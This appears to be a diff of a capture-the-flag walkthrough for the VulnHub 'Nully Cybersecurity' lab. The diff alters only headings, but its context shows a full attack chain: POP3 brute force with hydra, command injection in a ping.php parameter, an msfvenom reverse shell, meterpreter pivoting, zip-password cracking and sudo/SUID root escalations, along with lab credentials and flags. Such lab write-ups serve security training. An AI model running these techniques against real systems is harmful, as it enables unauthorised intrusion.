@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/nully-cybersecurity-1,549/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.108
@@ -132,7 +130,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
 ```
 
-### Scope / Rules
+## Scope / Rules
 
 * 3 Flags: MailServer, WebServer, DatabaseServer
 * Dont attack this port 80, 8000 and 9000 ports
@@ -141,7 +139,7 @@ Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
 * Hint: 'cat rockyou.txt | grep bobby > wordlist' for generating wordlist.
 * To start, check your email on port 110 with authorization data pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
 
-### Checking Email
+## Checking Email
 
 User: **pentester**\
 Pass: **qKnGByeaeQJWTjj2efHxst7Hu0xHADGO**
@@ -179,7 +177,7 @@ The boss has already informed me about you and that you need help accessing the 
 Sorry, I forgot my password, but I remember the password was simple.
 ```
 
-### Mail Server Brute Force
+## Mail Server Brute Force
 
 ```
 $ hydra -l bob -P nully_wordlist.txt 192.168.1.108 -vV -f pop3
@@ -221,7 +219,7 @@ Credentials:
 * User: **bob**
 * Pass: **bobby1985**
 
-### SSH Access
+## SSH Access
 
 ```
 $ ssh bob@192.168.1.108 -p 2222
@@ -244,7 +242,7 @@ bob@MailServer:~$ id
 uid=1000(bob) gid=1000(bob) groups=1000(bob)
 ```
 
-### Privilege Escalation - my2user
+## Privilege Escalation - my2user
 
 Bob user's is allowed to run `/bin/bash /opt/scripts/check.sh` as `my2user` without password
 ```
@@ -281,7 +279,7 @@ my2user@MailServer:~$ id
 uid=1001(my2user) gid=1001(my2user) groups=1001(my2user)
 ```
 
-### Privilege Escalation - Root
+## Privilege Escalation - Root
 
 `my2user` is allowed to run `/usr/bin/zip` command as root without password
 ```
@@ -304,7 +302,7 @@ root@MailServer:/home/my2user# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Flag #1 - Mail Server
+## Flag #1 - Mail Server
 
 ```
 root@MailServer:~# cat 1_flag.txt 
@@ -322,7 +320,7 @@ root@MailServer:~# cat 1_flag.txt
 	Now go to the web server and root it.
 ```
 
-### Internal Network Scan
+## Internal Network Scan
 
 ```
 root@MailServer:~# nmap -sV 172.17.0.0/24 > nmap_net.txt
@@ -351,7 +349,7 @@ MAC Address: 02:42:AC:11:00:04 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### Pivoting to WebServer
+## Pivoting to WebServer
 
 Creating a shell session with MailServer through SSH login
 ```
@@ -459,7 +457,7 @@ meterpreter > portfwd add -l 8181 -p 80 -r 172.17.0.4
 
 Now we are able to access the internal Web Server hosted at 172.17.0.4 using our localhost over 8181 port.
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://localhost:8181
@@ -484,7 +482,7 @@ GENERATED WORDS: 4612
 + http://localhost:8181/server-status (CODE:403|SIZE:276)
 ```
 
-### /ping Directory
+## /ping Directory
 
 [ GET ] http://localhost:8181/ping/For-Oscar.txt
 ```
@@ -504,7 +502,7 @@ Use the host parameter<pre>Array ( [0] => PING 172.17.0.2 (172.17.0.2) 56(84) by
 
 This mechanism is a high probable RCE (Remote Coding Exection) attack surface.
 
-### Validating RCE Vulnerability
+## Validating RCE Vulnerability
 
 [ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2;id
 ```
@@ -513,7 +511,7 @@ Use the host parameter<pre>Array ( [0] => PING 172.17.0.2 (172.17.0.2) 56(84) by
 
 RCE: [ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2;{command}
 
-### Reverse Shell
+## Reverse Shell
 
 Generating payload.\
 **Note**: msfvenom will generate a **python** payload, but we need to use **python3** instead of **python**.
@@ -548,7 +546,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Privilege Escalation - oscar
+## Privilege Escalation - oscar
 
 ```
 $ find / -type f -perm -u=s 2>/dev/null
@@ -609,7 +607,7 @@ oscar@WebServer:~$ id
 uid=1000(oscar) gid=1000(oscar) groups=1000(oscar)
 ```
 
-### Privilege Escalation - Root
+## Privilege Escalation - Root
 
 In `oscar` user's home we can find a script called `current-date` that apparently run as root.
 ```
@@ -661,7 +659,7 @@ root@WebServer:~/scripts# id
 uid=0(root) gid=0(root) groups=0(root),1000(oscar)
 ```
 
-### Flag #2 - Web Server
+## Flag #2 - Web Server
 
 ```
 root@WebServer:/root# cat 2_flag.txt
@@ -677,7 +675,7 @@ Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
 Now go to the Database server.
 ```
 
-### Port Scanning - DatabaseServer
+## Port Scanning - DatabaseServer
 
 Detalied port scanning
 ```
@@ -730,7 +728,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
 ```
 
-### FTP Access
+## FTP Access
 
 Getting `.backup.zip` file from `ftp`
 ```
@@ -766,7 +764,7 @@ meterpreter > download /home/bob/.backup.zip
 [*] download   : /home/bob/.backup.zip -> /home/burton/Downloads/nully/.backup.zip
 ```
 
-### Cracking ZIP Password
+## Cracking ZIP Password
 
 ```
 $ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' .backup.zip
@@ -788,7 +786,7 @@ Credentials:
 * User: **donald**
 * Pass: **HBRLoCZ0b9NEgh8vsECS**
 
-### SSH Access
+## SSH Access
 
 Using `donald` user's credentials, we are able to login via SSH
 ```
@@ -811,7 +809,7 @@ donald@DatabaseServer:~$ id
 uid=1000(donald) gid=1000(donald) groups=1000(donald)
 ```
 
-### Privilege Escalation - Root
+## Privilege Escalation - Root
 
 ```
 donald@DatabaseServer:~$ find / -type f -perm -u=s 2>/dev/null
@@ -871,7 +869,7 @@ root@DatabaseServer:~# id
 uid=0(root) gid=0(root) groups=0(root),1000(donald)
 ```
 
-### Flag #3 - Database Server
+## Flag #3 - Database Server
 
 ```
 root@DatabaseServer:~# cat /root/3_flag.txt 
